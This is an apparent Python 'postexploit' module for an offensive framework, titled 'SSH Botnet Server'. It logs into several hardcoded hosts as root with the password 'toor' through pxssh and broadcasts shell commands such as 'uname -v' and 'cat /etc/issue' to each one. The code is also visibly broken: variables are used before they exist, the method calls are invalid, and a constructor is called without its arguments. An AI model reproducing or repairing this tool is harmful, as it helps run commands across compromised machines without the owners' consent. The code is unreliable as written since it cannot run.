import  pyfiglet
from pexpect import pxssh
from collections import OrderedDict

MODULE_TYPE = "postexploit"
# Module class definition
class Client:
 def __init__(self, host, user, password):
  self.host = host
  self.user = user
  self.password = password
  self.session = self.connect()
 def connect(self):
  try:
   s = pxssh.pxssh()
   s.login(self.host, self.user, self.password)
   return s
  except Exception as e:
   print (e)
   print ('[-] Error Connecting')
 def send_command(self, cmd):
    self.session.sendline(cmd)
    self.session.prompt()
    return self.session.before
 def botnetCommand(self,command):
      for client in botNet:
          output = client.self.send_command(command)
          print ('[*] Output from ' + client.host)
          print ('[+] ' + output + '\n')
 def addClient(host, user, password):
      client = Client(host, user, password)
      botNet.append(client)
      botNet = []
      addClient('10.10.10.110', 'root', 'toor')
      addClient('10.10.10.120', 'root', 'toor')
      addClient('10.10.10.130', 'root', 'toor')


class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'SSH Botnet Server',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos/Android',
            'architectures':'x86/64 bit processors',
            'Description':'A lite remote ssh botnet server ',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('', ('', False, ''))
                ])
                }
    def logo(self):
    	title = 'ssh botnet'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: run")
   
    
    
    def execute(self):
      bot = Client()
      bot.botnetCommand('uname -v')
      bot.botnetCommand('cat /etc/issue')
      return "[+] Waiting for Botnets ..."
    